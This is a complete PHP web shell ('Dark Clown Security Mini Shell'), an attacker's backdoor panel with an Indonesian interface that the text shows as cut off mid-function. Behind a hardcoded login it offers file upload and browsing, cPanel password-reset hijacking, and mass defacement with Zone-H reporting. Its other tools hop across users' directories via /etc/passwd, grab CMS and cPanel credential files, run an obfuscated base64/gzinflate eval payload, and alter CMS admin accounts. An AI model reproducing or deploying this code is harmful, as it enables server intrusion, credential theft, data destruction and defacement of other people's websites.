<?php
@session_start();
@set_time_limit(0);


@$pass = $_POST['pass'];
$chk_login = true;
$username = "DarkClownSecurity";
$password = "DarkClownSecurity";


if($pass == $password)
{
 $_SESSION['nst'] = "$pass";
}

if($chk_login == true)
{
 if(!isset($_SESSION['nst']) or $_SESSION['nst'] != $password)
 {
 die("
 <title>[ ᗪ卂尺Ҝ 匚ㄥㄖ山几 丂乇匚ㄩ尺丨ㄒㄚ ]</title>
 <link href='https://fonts.googleapis.com/css2?family=Risque&display=swap' rel='stylesheet'>
<link rel='stylesheet' href='https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css' integrity='sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk' crossorigin='anonymous'>
<link href='//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet'>
<script src='https://unpkg.com/sweetalert/dist/sweetalert.min.js'></script>
<center>
<img src=https://i.ibb.co/1v8rxQ2/header.jpg width=350 height=150><br>
<script language='JavaScript1.2'>
function ClearError() {return true;}
window.onerror = ClearError;
</script>
<script>
window.onload = function() {
var h1 = document.getElementsByTagName('h1')[0],
text = h1.innerText || h1.textContent,
split = [], i, lit = 0, timer = null;
for(i = 0; i < text.length; ++i) {
split.push('<span>' + text[i] + '</span>');
}
h1.innerHTML = split.join('');
split = h1.childNodes;

var flicker = function() {
lit += 0.01;
if(lit >= 1) {
clearInterval(timer);
}
for(i = 0; i < split.length; ++i) {
if(Math.random() < lit) {
split[i].className = 'neon';
} else {
split[i].className = '';
}
}
}
setInterval(flicker, 100);
}
</script>
<br><br>
<h1>{{ ᗪ卂尺Ҝ 匚ㄥㄖ山几 丂乇匚ㄩ尺丨ㄒㄚ }}</h1>
  <center>
  <body>
  <style>
  body{
  background: url(https://wallpoper.com/images/00/24/43/35/black-textures_00244335.jpg);
  }
    h1 {
    color: #19abff;
    font-size: 40px;
    margin: 1px auto;
    text-align:center;
    text-transform:uppercase;
        }
    .neon {
    color: #FFFFFF;
    text-shadow: 0 0 5px #19abff, 0 0 10px #19abff, 0 0 20px #19abff, 0 0 45px #19abff, 0 0 40px #19abff;
    }</style>
  <center><br>
  <table border=0 cellpadding=0 cellspacing=0 width=100% height=100%><br>
  <table width=700 bgcolor=black border=5 bordercolor=fuchsia><tr><td>
  <font size=1 face=lobster><center>
  <b></font></a></b>
  <form method=post>
  <font size=4 color=yellow><strong><br><center>
</strong>
<font color=cyan>
<h2 style='color: cyan;'>{{ login }}</h2>
  <input type=password name=pass size=50>
  </form>
  <marquee behavior='alternate' scrollmount='10'>хαι ѕyɴdιcαтe - dαrĸ clowɴ ѕecυrιтy</marquee>
</strong><br>
  </td></tr></table>
  </td></tr></table><br></center>
  ");
 }
}


set_time_limit(0);
error_reporting(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}

echo '<!DOCTYPE HTML>
<html>
<head>

<link href="https://fonts.googleapis.com/css2?family=Risque&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
<title>ᗪ卂尺Ҝ 匚ㄥㄖ山几 丂乇匚ㄩ尺丨ㄒㄚ</title>
<style>
body{
font-family: "Risque", cursive;
background-color: #000022;
background-image: url(https://i.ibb.co/bdb2nHK/ah.jpg);
background-size: center; background-repeat:no-repeat; background-attachment: fixed; background-size: cover; background-position:center;
color: white;
}
#content tr:hover{
background-color: black;
text-shadow:0px 0px 10px black;
}
#content .first{
background-color: cyan;
text-shadow:0px 0px 10px black;
}
table{
border: 1px #000000 dotted;
}
a{
color: aqua;
text-decoration: none;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #000000 solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
.lazy {
  margin: 0;
  font-family:Supermercado One;
}
</style>
</head>


<body>
<center><h1><img src="header.jpg" height="150 width="150"><font color="white" face=""><br><div class="lazy">ᗪ卂尺Ҝ 匚ㄥㄖ山几 丂乇匚ㄩ尺丨ㄒㄚ<br> 🅼🅸🅽🅸 🆂🅷🅴🅻🅻 🆅.2</font></center></h1>
<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr><td><font color="white">Path :</font> ';
if(isset($_GET['path'])){
$path = $_GET['path'];
}else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);

foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}
echo '</td></tr><tr><td>';
if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo "<script type='text/javascript'>swal('Success', 'Berhasil Upload' , 'success')</script>";
}else{
echo "<script type='text/javascript'>swal('Gagal', 'Gagal Upload' , 'error')</script>";
}
}
	if(isset($_GET['dir'])) {
	$dir = $_GET['dir'];
	chdir($dir);
} else {
	$dir = getcwd();
}
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$kernel = php_uname();
$ip_web = gethostbyname($_SERVER['HTTP_HOST']);
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=aqua>Clear</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "Disable Functions : $show_ds<br>";
echo "System : <font color=aqua>".$kernel."</font><br>";
echo "Ip Address : <font color=aqua>".$ip_web."</font><br>";
$tanggal = mktime(date('m'), date("d"), date('Y'));
    echo "Tanggal : <b> <font color=aqua>" . date("d-m-Y", $tanggal ) . "</b></font>";
    date_default_timezone_set("Asia/Jakarta");
    $jam = date ("H:i:s");
    echo " | Pukul : <b> <font color=aqua>" . $jam . " " ." </b></font>";
    $a = date ("H");
    if (($a>=6) && ($a<=11)) {
        echo " <b>, <font color=aqua>Selamat Pagi Sobat Dark Clown Security !! </b>";
    }else if(($a>=11) && ($a<=15)){
        echo " , <font color=aqua>Selamat  Pagi Sobat Dark Clown Security !! ";
    }elseif(($a>15) && ($a<=18)){
        echo ",<font color=aqua> Selamat Siang Sobat Dark Clown Security !!";
    }else{
        echo ", <b> <font color=aqua>Selamat Malam Sobat Dark Clown Security !!</b>";
    }
echo "<center>";
echo "<hr>";
echo "<a href='?keluar' class='fiture btn btn-danger'><i class='fa fa-sign-out'></i> keluar Shell</a>";
echo "<!-- Split dropright button -->
<div class='btn-group dropright '>
  <button type='button' class='btn btn-danger'>
    Menu Tools
  </button>
  <button type='button' class='btn btn-danger dropdown-toggle dropdown-toggle-split' data-toggle='dropdown' aria-haspopup='true' aria-expanded='false'>
    <span class='sr-only'>Toggle Dropright</span>
  </button>
  <div class='dropdown-menu'>
    <!-- Dropdown menu links -->
    <button type='button' class='btn btn-dark'>[ <a href='?'>Home</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=cp'>cpanel reset Pw</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=zoneh'>Zone-h</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=jumping'>Jumping</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=masse'>Mass Delete</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=config'>Config_grab</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=auto_edit_user'>auto_edit_user</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=about'>About</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=adminer'>Adminer</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=sym'>Symlink</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=mass'>Mass Depes</a> ]</button><p><p>
    <button type='button' class='btn btn-dark'>[ <a href='?dir=$dir&to=cmd'>Command</a> ]</button><p><p>
  </div>
</div></font>";
				//keluar
				if (isset($_GET['keluar'])){
					session_start();
					session_destroy();
					echo '<script>window.location="?";</script>';
				}
echo "</center>";
echo "<hr>";
if($_GET['to'] == 'cp') {
	echo'<header> 
	<div class="card">
  <div class="card-header">
    <center><h3 style="color: black;">🅲🆁🅰🅲🅺 🅲🅿🅰🅽🅴🅻</h3></center>
  </div>
  <div class="card-body">
    <blockquote class="blockquote mb-0">
      <form action="#" method="post">
      <div class="input-group flex-nowrap">
  <div class="input-group-prepend">
    <span class="input-group-text" id="addon-wrapping"><i class="fa fa-envelope"></i></span>
  </div>
  <input type="email" name="email" placeholder="Email Lu Nee Chan" class="form-control" aria-label="Username" aria-describedby="addon-wrapping">
</div><center><br><input type="submit" name="submit" value="Crack"/></center>
	</form> <br>
      <footer class="blockquote-footer">Pastikan Cpanel terdapat menu<cite title="Source Title">Reset Password</cite></footer>
    </blockquote>
  </div>
</div>
	</header> 
	</center> 	 	  
	</p>'; ?> <?php $IIIIIIIIIIII = get_current_user(); $IIIIIIIIIII1 = $_SERVER['HTTP_HOST']; $IIIIIIIIIIlI = getenv('REMOTE_ADDR'); if (isset($_POST['submit'])) { $email = $_POST['email']; $IIIIIIIIIIl1 = 'email:' . $email; $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIII1I = fopen('/home/' . $IIIIIIIIIIII . '/.contactinfo', 'w'); fwrite($IIIIIIIIII1I, $IIIIIIIIIIl1); fclose($IIIIIIIIII1I); $IIIIIIIIIlIl = "https://"; $IIIIIIIIIlI1 = "2083"; $IIIIIIIIIllI = $IIIIIIIIIII1 . ':2083/resetpass?start=1'; $read_named_conf = @file('/home/' . $IIIIIIIIIIII . '/.cpanel/contactinfo'); if(!$read_named_conf) { echo "<script type='text/javascript'>swal('GAGAL', 'gabisa di akses om:(' , 'error')</script></h1>
	<br><br> 
	</pre>
	</center>"; } else { echo "<center>Ini UserName nya Salin Dulu Terus entot:v<br><br>
	</center>"; echo '<center><input type="text" value="' . $IIIIIIIIIIII . '" id="user"> <button onclick="username()">Salin User</button></center> <script>function username() { var copyText = document.getElementById("user"); copyText.select(); document.execCommand("copy"); } </script> '; echo '<br/><center><a target="_blank" href="' . $IIIIIIIIIlIl . '' . $IIIIIIIIIllI . '">Gass Disini</a><br><br></center>'; ;}}
	echo '</td></tr><tr><td>';
	}
 elseif($_GET['logout'] == true) {
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}

if($_GET['to'] == 'zoneh') {
	if($_POST['submit']) {
		$domain = explode("\r\n", $_POST['url']);
		$nick =  $_POST['nick'];
		echo "Defacer Onhold: <a href='http://www.zone-h.org/archive/notifier=$nick/published=0' target='_blank'>http://www.zone-h.org/archive/notifier=$nick/published=0</a><br>";
		echo "Defacer Archive: <a href='http://www.zone-h.org/archive/notifier=$nick' target='_blank'>http://www.zone-h.org/archive/notifier=$nick</a><br><br>";
		function zoneh($url,$nick) {
			$ch = curl_init("http://www.zone-h.com/notify/single");
				  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
				  curl_setopt($ch, CURLOPT_POST, true);
				  curl_setopt($ch, CURLOPT_POSTFIELDS, "defacer=$nick&domain1=$url&hackmode=1&reason=1&submit=Send");
			return curl_exec($ch);
				  curl_close($ch);
		}
		foreach($domain as $url) {
			$zoneh = zoneh($url,$nick);
			if(preg_match("/color=\"red\">OK<\/font><\/li>/i", $zoneh)) {
				echo "$url -> <font color=lime>OK</font><br>";
			} else {
				echo "$url -> <font color=red>ERROR</font><br>";
			}
		}
	} else {
		echo "<center>
		<div class='card'>
  <div class='card-header'>
    <h3 style='color: black;'>🅼🅰🆂🆂 🆉🅾🅽🅴-🅷</h3>
  </div>
  <div class='card-body'>
    <blockquote class='blockquote mb-0'>
      <form method='post'>
		<u><h5 style='color: black;'>Defacer :</u></h5>
		<input type='text' name='nick' size='50' value='Mr.TenAr'><br>
		<u><h5 style='color: black;'>Domains :</u></h5>
		<textarea style='width: 450px; height: 150px;' name='url'></textarea><br>
		<input type='submit' name='submit' value='Submit' style='width: 450px;'>
		</form>
      <footer class='blockquote-footer'>Zone-H Tidak Bisa Di fake deface<cite title='Source Title'> Jadi Jangan Sampah</cite></footer>
    </blockquote>
  </div>
</div><br>";
	}
	echo "</center>";
} elseif($_GET['to'] == 'mass') {
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	function sabun_biasa($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $dirb/$namafile<br>";
							file_put_contents($lokasi, $isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['start']) {
		if($_POST['tipe_sabun'] == 'mahal') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		} elseif($_POST['tipe_sabun'] == 'murah') {
			echo "<div style='margin: 5px auto; padding: 5px'>";
			sabun_biasa($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
			echo "</div>";
		}
	} else {
	echo "<center>";
	echo "
	<div class='card'>
  <div class='card-header'>
    <h3 style='color: black;'>🅼🅰🆂🆂 🅳🅴🅵🅰🅲🅴</h3>
  </div>
  <div class='card-body'>
    <blockquote class='blockquote mb-0'>
      <form method='post'>
	<font style='text-decoration: underline; color: black;'>Tipe Mass:</font><br>
	<input type='radio' name='tipe_sabun' value='murah' checked><font color='black'>Biasa</font><input type='radio' name='tipe_sabun' value='mahal'><font color='black'>Massal</font><br>
	<font style='text-decoration: underline; color: black;'>Folder:</font><br>
	<div class='input-group flex-nowrap'>
  <div class='input-group-prepend'>
    <span class='input-group-text' id='addon-wrapping'><i class='fa fa-folder'></i></span>
  </div>
  <input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10' class='form-control' placeholder='Username' aria-label='Username' aria-describedby='addon-wrapping'>
</div>
	<font style='text-decoration: underline;'>Filename:</font><br>
	<div class='input-group flex-nowrap'>
  <div class='input-group-prepend'>
    <span class='input-group-text' id='addon-wrapping'><i class='fa fa-file-code-o'></i></span>
  </div>
  <input type='text' type='text' name='d_file' value='dcs.txt' style='width: 450px;' height='10' class='form-control' placeholder='Username' aria-label='Username' aria-describedby='addon-wrapping'>
</div>
	<font style='text-decoration: underline;'>Index File:</font><br>
	<div class='input-group'>
  <div class='input-group-prepend'>
    <span class='input-group-text'>With textarea</span>
  </div>
  <textarea class='form-control' aria-label='With textarea' name='script' style='width: 450px; height: 200px;'>Hacked By Dark Clown Security</textarea>
</div><br>
	<input type='submit' name='start' value='TUSBOOL COK!' style='width: 450px;'>
	</form></center>
      <footer class='blockquote-footer'>Someone famous in <cite title='Source Title'>Source Title</cite></footer>
    </blockquote>
  </div>
</div>";
	} 
	}elseif($_GET['to'] == 'sym') {
echo '<hr>';
eval(gzinflate(base64_decode('7Vf/T9tGFP89Uv6H1yOT7ZHaSRBrReKUrjCt0lakAtskqCLHPmOPi8+6u2BSyv++d+fYpE4AlVbaJhWJyHnf/b583ksnnjMGPkglJoLmLAip3ZkcH77/4/D9mXVw9Ob098N3J5P3R0cn1ocuENKFTh6oxBm2W52oNwvSTKL6fpwyahOPqtDLghmN3JBnMdFSW1uJUmhWtltpbFc6zk27tT+7jFJhk4iGwWIiFzPS7b148UIr7YdJg2Wo9JqGNmEZPJfggeBcGXpHe9/BMKyjXKUcI3qbRSgr4RfOGC+OF7Pf0uwSIzhIBQ0VFwsjAMa8m6hZu/U6ik4WOQVFr5WHeUgzcPMkB8P5NcgiRkWT2W4dByqV8QJeZwvLBJLrMGKe08y20HAQ4otLq2sVVhloYfiFSBXmGaW7ZezOcD8OGZclUYvSMOFA2q2RCqaMQsDSi8wPaaYwjCkXERX+DlZtwahvFWmkkr2fej8MS87zkDMu9rZe/tzDv6E11maE+Yw+szQexTxTYMR9ls4oyPQj9QfjYxfecXfkafZ45KnoS5QPuCnxE7VPJRVP1cVCMyx0Q9vDdyemX0M+Rz0f+vgt5oIGYVJ3JAQSls+6ObFXqaAXqU0+8oySbsVybnIkT2aBCpNJwJhtbWkBILb7o0O2rG5lRD+UidDljNlcJrZ+QsM4bAwbRIl0ZldCZ/0PZ70PjgNjGGj/nTnmAUPNuUyvJxdU5cU8jWwzaLzIqFhO2xUmJpBUesRtmqq7CIvfyB8mpszhMnEEXKjS46LCPelnNEZqAImgsY9jne95XlEUbtO3S7yqRiyQ0lfXarwuU3sJVjxpOf3qZ5bGEcuI1bzKtdXRsOXV6OBpKPASPqPemrqXz6csDSc45cwCFQjMpW9NpizILq21KJsdtAxt2UOwWshlvra3h7e3t3WqPTOvpt9uKZNUl/Lk8PjELyHSMkXL0V0RWWU7gG0EnoSI/3VAhMcQER6AROQ2UREqWIQHcLE/LtEO7sEN0/M7GzHuEZUN2PSYk3VEqvEIPgckMO9dJ4usdApuXSKIA1wAvU6VTU4z8/aKg5YFrfjMVB6KRLfZs5hyXLaa7ujGgo7e0jG2vlxSjUODYlSzAiGChV1SdUB3IIcte+4huL1yzvfOPU9qhJPdWrdpaPWQIOVEdvFqqCRw9o3GHQrWhhD5+gP49AnWGL4PPc24c+MDmaYZWSPqlP3V73uxXOddBcJj6dTL7mMGIi80aTP3gucJFes8uTEQYy+arTPmEk0hNN0TQ6zyzW+VbWJoDcTfzQxzhxEHk423mEqzOb0bID0gDzXuho3wYLevwLzWq0KpFMmq50cMVBj/AMQ3XKwi/BrA1wMY3DN9Gr9rlKkmownmJZTr+5VLeIYJ/jPNIl5I4tzci9mbEFtfsGt4fYfW6PkLAbvXe/kNoLrd+mqwfgCpq0Ing2WZrcsBYzs70aAuDxxTcUXFyEsG428C7m8P/lVgV3SWY6IIGXbwQOvjY888DTTW65schfAAtZfskQ+GW37d3nbgpoPXnv5h1bj/jMASQfFwQJJTOnN9+JunWLY9q2vILjnPsHGrSlijqfDG1rAKrTw+9ZdlA+4i0URllo+iUrk4jgjeRblY4nxeLY/d7lJRk1dGZxdNray0ap9tsvpV+2x9mX2bTfZ9jX1fY//nNdYYxw2bbORF6RV+LoMmw3mmza5MplG6Bb3v4E59EwK+CbKM4yvjz2hFoYmHtQdtrvx/Nf4H')));
} elseif($_GET['to'] == 'jumping') {
	$i = 0;
	echo "<div class='margin: 5px auto;'>";
	if(preg_match("/hsphere/", $dir)) {
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace(array("http://","www."), "", strtolower($url));
				$etc = "/etc/passwd";
				$f = fopen($etc,"r");
				while($gets = fgets($f)) {
					$pecah = explode(":", $gets);
					$user = $pecah[0];
					$dir_user = "/hsphere/local/home/$user";
					if(is_dir($dir_user) === true) {
						$url_user = $dir_user."/".$url;
						if(is_readable($url_user)) {
							$i++;
							$jrw = "[<font color=lime>R</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							if(is_writable($url_user)) {
								$jrw = "[<font color=lime>RW</font>] <a href='?dir=$url_user'><font color=gold>$url_user</font></a>";
							}
							echo $jrw."<br>";
						}
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
			$fp = fopen("/hsphere/local/config/httpd/sites/sites.txt","r");
			while($getss = fgets($fp)) {
				echo $getss;
			}
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} elseif(preg_match("/vhosts|vhost/", $dir)) {
		preg_match("/\/var\/www\/(.*?)\//", $dir, $vh);
		$urls = explode("\r\n", $_POST['url']);
		if(isset($_POST['jump'])) {
			echo "<pre>";
			foreach($urls as $url) {
				$url = str_replace("www.", "", $url);
				$web_vh = "/var/www/".$vh[1]."/$url/httpdocs";
				if(is_dir($web_vh) === true) {
					if(is_readable($web_vh)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						if(is_writable($web_vh)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$web_vh'><font color=gold>$web_vh</font></a>";
						}
						echo $jrw."<br>";
					}
				}
			}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
		} else {
			echo '<center>
				  <form method="post">
				  List Domains: <br>
				  <textarea name="url" style="width: 500px; height: 250px;">';
				  bing("ip:$ip");
			echo  '</textarea><br>
				  <input type="submit" value="Jumping" name="jump" style="width: 500px; height: 25px;">
				  </form></center>';
		}
	} else {
		echo "<pre>";
		$etc = fopen("/etc/passwd", "r") or die("<center><h4>🅶🅰🅶🅰🅻 🅹🆄🅼🅿🅸🅽🅶</h4><br><font color=red>Can't read /etc/passwd</font></center>");
		while($passwd = fgets($etc)) {
			if($passwd == '' || !$etc) {
				echo "<font color=red>Can't read /etc/passwd</font>";
			} else {
				preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
				foreach($user_jumping[1] as $user_idx_jump) {
					$user_jumping_dir = "/home/$user_idx_jump/public_html";
					if(is_readable($user_jumping_dir)) {
						$i++;
						$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $user_idx_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}  //MASS DELETE/////////////////////////
elseif($_GET['to'] == 'masse') {
   function hapus_massal($dir,$namafile) {
if(is_writable($dir)) {
   $dira = scandir($dir);
   foreach($dira as $dirb) {
       $dirc = "$dir/$dirb";
       $lokasi = $dirc.'/'.$namafile;
       if($dirb === '.') {
           if(file_exists("$dir/$namafile")) {
               unlink("$dir/$namafile");
           }
       } elseif($dirb === '..') {
           if(file_exists("".dirname($dir)."/$namafile")) {
               unlink("".dirname($dir)."/$namafile");
           }
       } else {
           if(is_dir($dirc)) {
               if(is_writable($dirc)) {
                   if(file_exists($lokasi)) {
                       echo "[<font color=#52CF38>Terhapus</font>] $lokasi<br>";
                       unlink($lokasi);
                       $idx = hapus_massal($dirc,$namafile);
                   }
               }
           }
       }
   }
}
   }
   if($_POST['start']) {
   	echo "<script type='text/javascript'>swal('Success', 'Berhasil Di Delete' , 'success')</script>";
echo "<div style='margin: 5px auto; padding: 5px'>";
hapus_massal($_POST['d_dir'], $_POST['d_file']);
echo "</div>";
   } else {
   echo "<center>";
   echo "
   <div class='card'>
  <div class='card-header'>
    <h4 style='color: black;'>🅼🅰🆂🆂 🅳🅴🅻🅴🆃🅴</h4>
  </div>
  <div class='card-body'>
    <blockquote class='blockquote mb-0'>
      <form method='post'>
   <font color='black'>Folder :</font><br>
   <input type='text' name='d_dir' value='$path' style='width: 450px;' height='10'><br>
   <font color='black'>Filename :</font><br>
   <input type='text' name='d_file' value='nyawa lu aja mass delete gan:v' style='width: 450px;' height='10'><br><br>
   <input type='submit' name='start' value='Mass Delete' style='width: 450px;'>
   </form><br>
      <footer class='blockquote-footer'>Apakah Anda Yakin Ingin Menghapus file ini? <cite title='Source Title'> Pikirkan Baik-baik</cite></footer>
    </blockquote>
  </div>
</div>";
   }
 //CONFIG///////////
   } elseif($_GET['to'] == 'config') {
   $etc = fopen("/etc/passwd", "r") or die("<pre><center><h4>🅶🅰🅶🅰🅻 🅲🅾🅽🅵🅸🅶</h4><font color=#666>Can't read /etc/passwd</font></center>f</pre>");
   $idx = mkdir("XBoysX_CONFIG", 0777);
   $isi_htc = "Options all\nRequire None\nSatisfy Any";
   $htc = fopen("XBoysX_CONFIG/.htaccess","w");
   fwrite($htc, $isi_htc);
   while($passwd = fgets($etc)) {
   if($passwd == "" || !$etc) {
   echo "<font color=#666>Can't read /etc/passwd</font>";
   } else {
   preg_match_all('/(.*?):x:/', $passwd, $user_config);
   foreach($user_config[1] as $user_3X0RC1ST) {
   $user_config_dir = "/home/$user_XBoysX/public_html/";
   if(is_readable($user_config_dir)) {
   $grab_config = array(
   "/home/$user_XBoysX/.my.cnf" => "cpanel",
   "/home/$user_XBoysX/.accesshash" => "WHM-accesshash",
   "/home/$user_XBoysX/public_html/vdo_config.php" => "Voodoo",
   "/home/$user_XBoysX/public_html/bw-configs/config.ini" => "BosWeb",
   "/home/$user_XBoysX/public_html/config/koneksi.php" => "Lokomedia",
   "/home/$user_XBoysX/public_html/lokomedia/config/koneksi.php" => "Lokomedia",
   "/home/$user_XBoysX/public_html/clientarea/configuration.php" => "WHMCS",
   "/home/$user_XBoysX/public_html/whm/configuration.php" => "WHMCS",
   "/home/$user_XBoysX/public_html/whmcs/configuration.php" => "WHMCS",
   "/home/$user_XBoysX/public_html/forum/config.php" => "phpBB",
   "/home/$user_XBoysX/public_html/sites/default/settings.php" => "Drupal",
   "/home/$user_XBoysX/public_html/config/settings.inc.php" => "PrestaShop",
   "/home/$user_XBoysX/public_html/app/etc/local.xml" => "Magento",
   "/home/$user_XBoysX/public_html/joomla/configuration.php" => "Joomla",
   "/home/$user_XBoysX/public_html/configuration.php" => "Joomla",
   "/home/$user_XBoysX/public_html/wp/wp-config.php" => "WordPress",
   "/home/$user_XBoysX/public_html/wordpress/wp-config.php" => "WordPress",
   "/home/$user_XBoysX/public_html/wp-config.php" => "WordPress",
   "/home/$user_XBoysX/public_html/admin/config.php" => "OpenCart",
   "/home/$user_XBoysX/public_html/slconfig.php" => "Sitelok",
   "/home/$user_XBoysX/public_html/application/config/database.php" => "Ellislab");
   foreach($grab_config as $config => $nama_config) {
   $ambil_config = file_get_contents($config);
   if($ambil_config == '') {
   } else {	
   $file_config = fopen("XBoysX_CONFIG/$user_jefri-$nama_config.txt","w");
   fputs($file_config,$ambil_config);
   }
   }
   }      
   }
   }  
   }
   echo "<center><a href='?path=$path/3X0RC1ST_CONFIG'><font color=#52CF38>Selesai!</font></a></center>";
   
  } elseif($_GET['to'] == 'auto_edit_user') {
 if($_POST['hajar']) {
 if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
 echo "<script type='text/javascript'>swal('Gagal Bro', 'username atau password harus lebih dari 6 karakter' , 'error')</script>";
 } else {
 $user_baru = $_POST['user_baru'];
 $pass_baru = md5($_POST['pass_baru']);
 $conf = $_POST['config_dir'];
 $scan_conf = scandir($conf);
 foreach($scan_conf as $file_conf) {
 if(!is_file("$conf/$file_conf")) continue;
 $config = file_get_contents("$conf/$file_conf");
 if(preg_match("/JConfig|joomla/",$config)) {
 $dbhost = ambilkata($config,"host = '","'");
 $dbuser = ambilkata($config,"user = '","'");
 $dbpass = ambilkata($config,"password = '","'");
 $dbname = ambilkata($config,"db = '","'");
 $dbprefix = ambilkata($config,"dbprefix = '","'");
 $prefix = $dbprefix."users";
 $conn = mysql_connect($dbhost,$dbuser,$dbpass);
 $db = mysql_select_db($dbname);
